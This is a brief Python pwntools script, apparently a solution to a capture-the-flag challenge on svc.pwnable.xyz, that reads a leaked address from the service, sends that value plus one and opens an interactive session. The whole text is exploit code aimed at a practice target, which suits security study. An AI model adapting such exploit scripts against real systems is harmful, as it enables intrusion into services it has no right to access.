from pwn import *

p = remote("svc.pwnable.xyz",30000)
p.recvuntil("Leak: ")
leak = int(p.recvline(),16)
p.sendline(str(leak+1))
p.interactive()